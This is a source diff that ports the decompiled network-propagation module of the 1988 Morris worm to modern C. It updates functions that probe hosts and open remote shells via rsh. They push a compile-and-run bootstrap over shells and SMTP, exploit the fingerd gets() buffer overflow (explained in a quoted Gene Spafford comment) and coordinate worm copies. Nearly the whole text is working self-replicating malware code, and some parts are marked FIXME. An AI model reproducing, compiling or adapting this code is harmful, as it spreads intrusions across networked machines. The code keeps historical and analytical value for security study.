@@ -13,11 +13,13 @@
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <string.h>
 
 extern struct hst *h_addr2host(), *h_name2host();
-extern int  justreturn();
 extern int errno;
-extern char *malloc();
 
 int alarmed = 0;
 int ngateways, *gateways;
@@ -26,8 +28,26 @@ struct hst *me, *hosts;
 int nifs;
 struct ifses ifs[30];				/*  Arbitrary number, fix */
 
+static int command_port_p(u_long addr, int time);
+static int try_telnet_p(u_long addr);
+static int try_rsh_and_mail(struct hst *host);
+static int talk_to_sh(struct hst *host, int fdrd, int fdwr);
+static int compile_slave(struct hst *host, int s, int arg16, int arg20, int arg24);
+static ssize_t send_text(int fd, char *str);
+static int fork_rsh(char *host, int *fdp1, int *fdp2, char *str);
+static int wait_for(int fd, char *str, int time);
+static int test_connection(int rdfd, int wrfd, int time);
+static int x488e(int fd, char *buf, int num_chars, int maxtime);
+static char *movstr(char *arg0, char *arg1);
+static int try_finger(struct hst *host, int *fd1, int *fd2);
+static int byte_swap(int arg);
+static int try_mail(struct hst *host);
+static int x50bc(/*socket*/int s, char *buffer);
+static int x538e(struct hst *host, char *name1, char *name2);
+static void answer_other();
+
 /* Clean hosts not contacted from the host list. */
-h_clean()					/* 0x31f0 */
+void h_clean()					/* 0x31f0 */
 {
     struct hst *newhosts, *host, *next;
     
@@ -45,7 +65,7 @@ h_clean()					/* 0x31f0 */
 }
 
 /* Look for a gateway we can contact. */
-hg()				/* 0x3270, check again */
+int hg()				/* 0x3270, check again */
 {
     struct hst *host;
     int i;
@@ -60,7 +80,7 @@ hg()				/* 0x3270, check again */
     return 0;
 }
 
-ha()						/* 0x32d4, unchecked */
+int ha()						/* 0x32d4, unchecked */
 {
     struct hst *host;
     int i, j, k;
@@ -91,7 +111,7 @@ ha()						/* 0x32d4, unchecked */
     return 0;
 }
 
-hl()						/* 0x33e6 */
+int hl()						/* 0x33e6 */
 {
     int i;
     
@@ -104,7 +124,7 @@ hl()						/* 0x33e6 */
     return 0;
 }
 
-hi()						/* 0x3458 */
+int hi()						/* 0x3458 */
 {
     struct hst *host;
     
@@ -114,7 +134,7 @@ hi()						/* 0x3458 */
     return 0;
 }
 
-hi_84(arg1)					/* 0x34ac */
+int hi_84(int arg1)					/* 0x34ac */
 {
     int l4;
     struct hst *host;
@@ -162,13 +182,11 @@ hi_84(arg1)					/* 0x34ac */
 }
 
 /* Only called in the function above */
-static command_port_p(addr, time)		/* x36d2, <hi+634> */
-     u_long addr;
-     int time;
+static int command_port_p(u_long addr, int time) /* x36d2, <hi+634> */
 {
-    int s, connection;					/* 28 */
-    struct sockaddr_in sin;			/* 16 bytes */
-    int (*save_sighand)();
+    int s, connection;				 /* 28 */
+    struct sockaddr_in sin;                      /* 16 bytes */
+    void (*save_sighand)();
     
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s < 0)
@@ -176,32 +194,29 @@ static command_port_p(addr, time)		/* x36d2, <hi+634> */
     bzero(&sin, sizeof(sin));
     sin.sin_family = AF_INET;
     sin.sin_addr.s_addr = addr;
-    sin.sin_port = IPPORT_CMDSERVER;		/* Oh no, not the command serve
-r... */
+    sin.sin_port = IPPORT_CMDSERVER;             /* Oh no, not the command server... */
     
-    save_sighand = signal(SIGALRM, justreturn);		/* Wakeup if it
- fails */
+    save_sighand = signal(SIGALRM, justreturn);	 /* Wakeup if it fails */
     
     /* Set up a timeout to break from connect if it fails */
     if (time < 1)
 	time = 1;
     alarm(time);
-    connection = connect(s, &sin, sizeof(sin));
+    connection = connect(s, (struct sockaddr *)&sin, sizeof(sin));
     alarm(0);
     
     close(s);
     
     if (connection < 0 && errno == ENETUNREACH)
-	error("Network unreachable");
+	perror("Network unreachable");
     return connection != -1;
 }
 
-static try_telnet_p(addr)			/* x37b2 <hi+858>, checked */
-     u_long addr;
+static int try_telnet_p(u_long addr)               /* x37b2 <hi+858>, checked */
 {
-    int s, connection;					/* 28 */
-    struct sockaddr_in sin;			/* 16 bytes */
-    int (*save_sighand)();
+    int s, connection;                             /* 28 */
+    struct sockaddr_in sin;                        /* 16 bytes */
+    void (*save_sighand)();
     
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s < 0)
@@ -209,16 +224,15 @@ static try_telnet_p(addr)			/* x37b2 <hi+858>, checked */
     bzero(&sin, sizeof(sin));
     sin.sin_family = AF_INET;
     sin.sin_addr.s_addr = addr;
-    sin.sin_port = IPPORT_TELNET;		/* This time try telnet... */
+    sin.sin_port = IPPORT_TELNET;                  /* This time try telnet... */
     
-    /* Set up a 5 second timeout, break from connect if it fails */
+    // Set up a 5 second timeout, break from connect if it fails
     save_sighand = signal(SIGALRM, justreturn);
     alarm(5);
-    connection = connect(s, &sin, sizeof(sin));
-    if (connection < 0  &&  errno == ECONNREFUSED) /* Telnet connection refuse
-d */
+    connection = connect(s, (struct sockaddr *)&sin, sizeof(sin));
+    if (connection < 0  &&  errno == ECONNREFUSED) /* Telnet connection refused */
 	connection = 0;
-    alarm(0);					/* Turn off timeout */
+    alarm(0);                                      /* Turn off timeout */
     
     close(s);
     
@@ -226,13 +240,12 @@ d */
 }
 
 /* Used in hg(), hi(), and hi_84(). */
-static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
-     struct hst *host;
+static int try_rsh_and_mail(struct hst *host) /* x3884, <hi+1068> */
 {
     int fd1, fd2, result;
     
     if (host == me)
-	return 0;				/* 1476 */
+	return 0;			      /* 1476 */
     if (host->flag & 0x02)
 	return 0;
     if (host->flag & 0x04)
@@ -244,14 +257,14 @@ static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
 	return 0;
     }
     other_sleep(1);
-    if (host->hostname  &&		/* 1352 */
+    if (host->hostname  &&                    /* 1352 */
 	fork_rsh(host->hostname, &fd1, &fd2,
-	      XS("exec /bin/sh"))) {		/* <env+188> */
+	      XS("exec /bin/sh"))) {	      /* <env+188> */
 	result = talk_to_sh(host, fd1, fd2);
 	close(fd1);
 	close(fd2);
-	/* Prevent child from hanging around in the <exiting> state */
-	wait3((union wait *)NULL, WNOHANG, (struct rusage *)NULL);
+	// Prevent child from hanging around in the <exiting> state
+	wait3((int *)NULL, WNOHANG, (struct rusage *)NULL);
 	if (result != 0)
 	    return result;
     }
@@ -273,10 +286,8 @@ static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
 
 /* Check a2in() as it is updated */
 /* Used in twice in try_rsh_and_mail(), once in hu1(). */
-static talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
+static int talk_to_sh(struct hst *host, int fdrd, int fdwr) /* x3a20, Checked, changed <hi+
 >*/
-     struct hst *host;
-     int fdrd, fdwr;
 {
     object *objectptr;
     char send_buf[512];				/* l516 */
@@ -316,7 +327,7 @@ static talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
     
 #define COMPILE  "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"
     sprintf(send_buf, XS(COMPILE), l576, l576, l576,
-	    inet_ntoa(a2in(l592)), l580, l584, l576, l576);
+	    inet_ntoa(*a2in(l592)), l580, l584, l576, l576);
     
     
     send_text(fdwr, send_buf);
@@ -328,9 +339,7 @@ static talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
     return waithit(host, l592, l580, l584, l588);
 }
 
-makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
-     struct hst *arg8;
-     int *arg12, *arg16, *arg20, *arg24;
+int makemagic(struct hst *arg8, int *arg12, int *arg16, int *arg20, int *arg24) /* checked */
 {
     int s, i, namelen;
     struct sockaddr_in sin0, sin1;		/* 16 bytes */
@@ -340,7 +349,7 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
     sin1.sin_addr.s_addr = me->l12;
     
     for (i= 0; i < 6; i++) {			/* 64, 274 */
-	if (arg8->o48[i] == NULL)
+	if (arg8->o48[i] == /*NULL*/0)
 	    continue;				/* 266 */
 	s = socket(AF_INET, SOCK_STREAM, 0);
 	if (s < 0)
@@ -350,9 +359,9 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
 	sin0.sin_port = IPPORT_TELNET;
 	sin0.sin_addr.s_addr = arg8->o48[i];
 	errno = 0;
-	if (connect(s, &sin0, sizeof(sin0)) != -1) {
+	if (connect(s, (struct sockaddr *)&sin0, sizeof(sin0)) != -1) {
 	    namelen = sizeof(sin1);
-	    getsockname(s, &sin1, &namelen);
+	    getsockname(s, (struct sockaddr *)&sin1, &namelen);
 	    close(s);
 	    break;
 	}
@@ -368,7 +377,7 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
 	bzero(&sin0, sizeof(sin0));
 	sin0.sin_family = AF_INET;
 	sin0.sin_port = random() % 0xffff;
-	if (bind(s, &sin0, sizeof(sin0)) != -1) {
+	if (bind(s, (struct sockaddr *)&sin0, sizeof(sin0)) != -1) {
 	    listen(s, 10);
 	    *arg16 = sin0.sin_port;
 	    *arg24 = s;
@@ -380,15 +389,13 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
     return 0;
 }
 
-/* Check for somebody connecting.  If there is a connection and he has the rig
-ht
- * key, send out the
- * a complete set of encoded objects to it. */
-
-waithit(host, arg1, arg2, key, arg4)		/* 0x3e86 */
-     struct hst *host;
+/* Check for somebody connecting. 
+ * If there is a connection and he has the right key, send out the a complete set
+ * of encoded objects to it. 
+ */
+int waithit(struct hst *host, int arg1, int arg2, int key, int arg4)		/* 0x3e86 */
 {
-    int (*save_sighand)();
+    void (*save_sighand)();
     int l8, sin_size, l16, i, l24, l28;
     struct sockaddr_in sin;			/* 44 */
     object *obj;
@@ -400,12 +407,12 @@ waithit(host, arg1, arg2, key, arg4)		/* 0x3e86 */
     
     sin_size = sizeof(sin);
     alarm(2*60);
-    l8 = accept(arg4, &sin, &sin_size);
+    l8 = accept(arg4, (struct sockaddr *)&sin, &sin_size);
     alarm(0);
     
     if (l8 < 0)
 	goto quit;				/* 1144 */
-    if (xread(l8, &l16, sizeof(l16), 10) != 4)
+    if (xread(l8, (char *)&l16, sizeof(l16), 10) != 4)
 	goto quit;
     l16 = ntohl(l16);
     if (key != l16)
@@ -477,8 +484,9 @@ waithit(host, arg1, arg2, key, arg4)		/* 0x3e86 */
 }
 
 /* Only called from within mail */
-static compile_slave(host, s, arg16, arg20, arg24) /* x431e, <waithit+1176> */
-     struct hst host;
+static int compile_slave(struct hst *host, int s,
+                         // FIXME: types
+                         int arg16, int arg20, int arg24) /* x431e, <waithit+1176> */
 {     
     object *obj;
     char buf[512];				/* 516 */
@@ -505,21 +513,19 @@ static compile_slave(host, s, arg16, arg20, arg24) /* x431e, <waithit+1176> */
     
     sprintf(buf, XS("cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n"),
 	    key, key, key,
-	    inet_ntoa(a2in(arg16, arg20, arg24, key, key)->baz));
+            // FIXME:
+            // inet_ntoa(a2in(arg16, arg20, arg24, key, key)->s_addr));
+            inet_ntoa(*a2in(arg16)));
     return send_text(s, buf);
 }
 
-static send_text(fd, str)			/* 0x44c0, <waithit+1594> */
-     char *str;
+static ssize_t send_text(int fd, char *str)			/* 0x44c0, <waithit+1594> */
 {
-    write(fd, str, strlen(str));
+    return write(fd, str, strlen(str));
 }
 
 /* Used in try_rsh_and_mail(). */
-static fork_rsh(host, fdp1, fdp2, str)		/* 0x44f4, <waithit+1646> */
-     char *host;
-     int *fdp1, *fdp2;
-     char *str;
+static int fork_rsh(char *host, int *fdp1, int *fdp2, char *str)		/* 0x44f4, <waithit+1646> */
 {
     int child;					/* 4 */
     int fildes[2];				/* 12 */
@@ -576,9 +582,7 @@ static fork_rsh(host, fdp1, fdp2, str)		/* 0x44f4, <waithit+1646> */
     return 0;
 }
 
-static test_connection(rdfd, wrfd, time)			/* x476c,<waith
-it+2278> */
-     int rdfd, wrfd, time;
+static int test_connection(int rdfd, int wrfd, int time) /* x476c,<waithit+2278> */
 {
     char combuf[100], numbuf[100];
     
@@ -588,9 +592,7 @@ it+2278> */
     return wait_for(rdfd, numbuf, time);
 }
 
-static wait_for(fd, str, time)			/* <waithit+2412> */
-     int fd, time;
-     char *str;
+static int wait_for(int fd, char *str, int time)			/* <waithit+2412> */
 {
     char buf[512];
     int i, length;
@@ -606,16 +608,12 @@ static wait_for(fd, str, time)			/* <waithit+2412> */
 }
 
 /* Installed as a signal handler */
-justreturn(sig, code, scp)					/* 0x4872 */
-     int sig, code;
-     struct sigcontext *scp;
+void justreturn(int sig) //, int code, struct sigcontext *scp) /* 0x4872 */
 {
     alarmed = 1;
 }
 
-static x488e(fd, buf, num_chars, maxtime)
-     int fd, num_chars, maxtime;
-     char *buf;
+static int x488e(int fd, char *buf, int num_chars, int maxtime)
 {	
     
     int i, l8, readfds;
@@ -641,9 +639,8 @@ static x488e(fd, buf, num_chars, maxtime)
 }
 
 /* This doesn't appear to be used anywhere??? */
-static char *movstr(arg0, arg1)			/* 0x4958,<just_return+
+static char *movstr(char *arg0, char *arg1) /* 0x4958,<just_return+
 230> */
-     char *arg0, *arg1;
 {
     arg1[0] = '\0';
     if (arg0 == 0)
@@ -662,34 +659,33 @@ static char *movstr(arg0, arg1)			/* 0x4958,<just_return+
 }
 
 /* 
-From Gene Spafford <spaf@perdue.edu>
-What this routine does is actually kind of clever.  Keep in
-mind that on a Vax the stack grows downwards.
+   From Gene Spafford <spaf@perdue.edu>
+   What this routine does is actually kind of clever.  Keep in
+   mind that on a Vax the stack grows downwards.
 
-fingerd gets its input via a call to gets, with an argument
-of an automatic variable on the stack.  Since gets doesn't
-have a bound on its input, it is possible to overflow the
-buffer without an error message.  Normally, when that happens
-you trash the return stack frame.  However, if you know
-where everything is on the stack (as is the case with a
-distributed binary like BSD), you can put selected values
-back in the return stack frame.
+   fingerd gets its input via a call to gets, with an argument
+   of an automatic variable on the stack.  Since gets doesn't
+   have a bound on its input, it is possible to overflow the
+   buffer without an error message.  Normally, when that happens
+   you trash the return stack frame.  However, if you know
+   where everything is on the stack (as is the case with a
+   distributed binary like BSD), you can put selected values
+   back in the return stack frame.
 
-This is what that routine does.  It overwrites the return frame
-to point into the buffer that just got trashed.  The new code
-does a chmk (change-mode-to-kernel) with the service call for
-execl and an argument of "/bin/sh".  Thus, fingerd gets a
-service request, forks a child process, tries to get a user name
-and has its buffer trashed, does a return, exec's a shell,
-and then proceeds to take input off the socket -- from the
-worm on the other machine.  Since many sites never bother to
-fix fingerd to run as something other than root.....
+   This is what that routine does.  It overwrites the return frame
+   to point into the buffer that just got trashed.  The new code
+   does a chmk (change-mode-to-kernel) with the service call for
+   execl and an argument of "/bin/sh".  Thus, fingerd gets a
+   service request, forks a child process, tries to get a user name
+   and has its buffer trashed, does a return, exec's a shell,
+   and then proceeds to take input off the socket -- from the
+   worm on the other machine.  Since many sites never bother to
+   fix fingerd to run as something other than root.....
 
-Luckily, the code doesn't work on Suns -- it just causes it
-to dump core.
+   Luckily, the code doesn't work on Suns -- it just causes it
+   to dump core.
 
---spaf
-
+   --spaf
 */    
 
 /* This routine exploits a fixed 512 byte input buffer in a VAX running
@@ -698,16 +694,14 @@ to dump core.
  * PC, to point into the middle of the string sent over.  The instructions
  * in the string do the direct system call version of execve("/bin/sh"). */
 
-static try_finger(host, fd1, fd2)		/* 0x49ec,<just_return+378 */
-     struct hst *host;
-     int *fd1, *fd2;
+static int try_finger(struct hst *host, int *fd1, int *fd2) /* 0x49ec,<just_return+378 */
 {
     int i, j, l12, l16, s;
     struct sockaddr_in sin;			/* 36 */
     char unused[492];
     int l552, l556, l560, l564, l568;
     char buf[536];				/* 1084 */
-    int (*save_sighand)();			/* 1088 */
+    void (*save_sighand)();			/* 1088 */
 
     save_sighand = signal(SIGALRM, justreturn);
 
@@ -723,7 +717,7 @@ static try_finger(host, fd1, fd2)		/* 0x49ec,<just_return+378 */
 	sin.sin_port = IPPORT_FINGER;
 
 	alarm(10);
-	if (connect(s, &sin, sizeof(sin)) < 0) {
+	if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
 	    alarm(0);
 	    close(s);
 	    continue;
@@ -756,7 +750,7 @@ static try_finger(host, fd1, fd2)		/* 0x49ec,<just_return+378 */
     l564 = byte_swap(l564);
     l568 = byte_swap(l568);
     l552 = byte_swap(l552);
-#endif sun
+#endif /*sum*/
 
     write(s, buf, sizeof(buf));			/* sizeof == 536 */
     write(s, XS("\n"), 1);
@@ -770,8 +764,7 @@ static try_finger(host, fd1, fd2)		/* 0x49ec,<just_return+378 */
     return 0;
 }
 
-static byte_swap(arg)			/* 0x4c48,<just_return+982 */
-     int arg;
+static int byte_swap(int arg) /* 0x4c48,<just_return+982 */
 {
     int i, j;
 
@@ -786,9 +779,7 @@ static byte_swap(arg)			/* 0x4c48,<just_return+982 */
     return i;
 }
 
-permute(ptr, num, size)			/* 0x4c9a */
-     char *ptr;
-     int num, size;
+void permute(int *ptr, int num, int size)			/* 0x4c9a */
 {
     int i, newloc;
     char buf[512];
@@ -803,18 +794,17 @@ permute(ptr, num, size)			/* 0x4c9a */
 
 
 /* Called from try_rsh_and_mail() */
-static try_mail(host)				/* x4d3c <permute+162>*/
-     struct hst *host;
+static int try_mail(struct hst *host)  /* x4d3c <permute+162>*/
 {
     int i, l8, l12, l16, s;
     struct sockaddr_in sin;			/* 16 bytes */
     char l548[512];
-    int (*old_handler)();
+    void (*old_handler)();
     struct sockaddr saddr;			/* Not right */
-    int fd_tmp;					/* ???  part of saddr *
-/
+    int key;
+    int fd_tmp;					/* ???  part of saddr */
     
-    if (makemagic(host, &saddr) == 0)
+    if (makemagic(host, /*???*/&key, &l8, &l12, &l16) == 0)
 	return 0;				/* <permute+1054> */
     old_handler = signal(SIGALRM, justreturn);
     for( i = 0; i < 6; i++) {			/* to 430 */
@@ -830,7 +820,7 @@ static try_mail(host)				/* x4d3c <permute+162>*/
 	sin.sin_port = IPPORT_SMTP;
 	
 	alarm(10);
-	if (connect(s, &sin, sizeof(sin)) < 0) {
+	if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
 	    alarm(0);
 	    close(s);
 	    continue;				/* to 422 */
@@ -867,7 +857,7 @@ static try_mail(host)				/* x4d3c <permute+162>*/
     
     send_text(s, XS("data\n"));
     
-    compile_slave(host, s, saddr);
+    compile_slave(host, s, l8, l12, l16); //saddr);
     
     send_text(s, XS("\n.\n"));
     
@@ -883,7 +873,7 @@ static try_mail(host)				/* x4d3c <permute+162>*/
     }
     
     close(s);
-    return waithit(host, saddr);
+    return waithit(host, l8, l12, i, l16);
  bad:
     send_text(s, XS("quit\n"));
     x50bc(s, l548);
@@ -891,26 +881,20 @@ static try_mail(host)				/* x4d3c <permute+162>*/
     return 0;
 }
 
-/* Used only in try_mail() above.  This fills buffer with a line of the respon
-se */
-static x50bc(s, buffer)				/* x50bc, <permute+1058
-> */
-     int s;					/* socket */
-     char *buffer;
+/* Used only in try_mail() above.  This fills buffer with a line of the response */
+static int x50bc(/*socket*/int s, char *buffer) /* x50bc, <permute+1058> */
 {
     /* Fill in exact code later.  It's pretty boring. */
 }
 
 
-/* I call this "huristic 1". It tries to breakin using the remote execution
- * service.  It is called from a subroutine of cracksome_1 with information fr
-om
+/*
+ * I call this "huristic 1". It tries to breakin using the remote execution
+ * service.  It is called from a subroutine of cracksome_1 with information from
  * a user's .forword file.  The two name are the original username and the one
  * in the .forward file.
  */
-hu1(alt_username, host, username2)		/* x5178 */
-     char *alt_username, *username2;
-     struct hst *host;
+int hu1(char *alt_username, struct hst *host, char *username2)		/* x5178 */
 {
     char username[256];
     char buffer2[512];
@@ -963,13 +947,12 @@ hu1(alt_username, host, username2)		/* x5178 */
     return 0;
 }
 
-/* Used in hu1.  Returns a file descriptor. */
-/* It goes through the six connections in host trying to connect to the
+/* 
+ * Used in hu1.  Returns a file descriptor.
+ * It goes through the six connections in host trying to connect to the
  * remote execution server on each one.
  */
-static int x538e(host, name1, name2)
-     struct hst *host;
-     char *name1, *name2;
+static int x538e(struct hst *host, char *name1, char *name2)
 {
     int s, i;
     struct sockaddr_in sin;			/* 16 bytes */
@@ -1017,11 +1000,9 @@ tup
     return -1;
 }
 
-/* Reads in a file and puts it in the 'objects' array.  Returns 1 if sucessful
-,
- * 0 if not. */
-loadobject(obj_name)				/* x5594 */
-     char *obj_name;
+/* Reads in a file and puts it in the 'objects' array. Returns 1 if sucessful, 0
+ * if not. */
+int loadobject(char *obj_name)				/* x5594 */
 {
     int fd;
     unsigned long size;
@@ -1061,23 +1042,16 @@ loadobject(obj_name)				/* x5594 */
     return 1;
 }
 
-/* Returns the object from the 'objects' array that has name, otherwise NULL. 
-*/
-object *getobjectbyname(name)
-     char *name;
-{
-    int i;
-    
-    for (i = 0; i < nobjects; i++)
+/* Returns the object from the 'objects' array that has name, otherwise NULL. */
+object *getobjectbyname(char *name) {
+    for (int i = 0; i < nobjects; i++)
 	if (strcmp(name, objects[i].name) == 0)
 	    return &objects[i];
     return NULL;
 }
 
 /* Encodes and decodes the binary coming over the socket. */
-xorbuf(buf, size)				/* 0x577e */
-     char *buf;
-     unsigned long size;
+void xorbuf(char *buf, unsigned long size)				/* 0x577e */
 {
     char *addr_self;			/* The address of the xorbuf fuction */
     int i;
@@ -1094,10 +1068,12 @@ xorbuf(buf, size)				/* 0x577e */
 
 static other_fd = -1;
 
-/* Make a connection to the local machine and see if I'm running in
-   another process by sending a magic number on a random port and waiting
-   five minutes for a reply. */
-checkother()					/* 0x57d0 */
+/* 
+ * Make a connection to the local machine and see if I'm running in
+ * another process by sending a magic number on a random port and waiting
+ * five minutes for a reply. 
+ */
+void checkother()					/* 0x57d0 */
 {
     int s, l8, l12, l16, optval;
     struct sockaddr_in sin;			/* 16 bytes */
@@ -1168,7 +1144,7 @@ checkother()					/* 0x57d0 */
 }
 
 /* Sleep, waiting for another worm to contact me. */
-other_sleep(how_long)				/* 0x5a38 */
+void other_sleep(int how_long)				/* 0x5a38 */
 {
     int nfds, readmask;
     long time1, time2;
@@ -1205,7 +1181,7 @@ other_sleep(how_long)				/* 0x5a38 */
     return;
 }
 
-static answer_other()				/* 0x5b14 */
+static void answer_other()				/* 0x5b14 */
 {
     int ns, addrlen, magic_holder, magic1, magic2;
     struct sockaddr_in sin;			/* 16 bytes */
@@ -1255,10 +1231,7 @@ static answer_other()				/* 0x5b14 */
 }
 
 /* A timeout-based read. */
-xread(fd, buf, length, time)			/* 0x5ca8 */
-     int fd, time;
-     char *buf;
-     unsigned long length;
+int xread(int fd, char *buf, unsigned long length, int time) /* 0x5ca8 */
 {
     int i, cc, readmask;
     struct timeval timeout;
@@ -1280,7 +1253,8 @@ xread(fd, buf, length, time)			/* 0x5ca8 */
 }
 
 
-/* These are some of the strings that are encyphed in the binary.  The
+/* 
+ * These are some of the strings that are encyphed in the binary.  The
  * person that wrote the program probably used the Berkeley 'xstr' program
  * to extract and encypher the strings.
  */
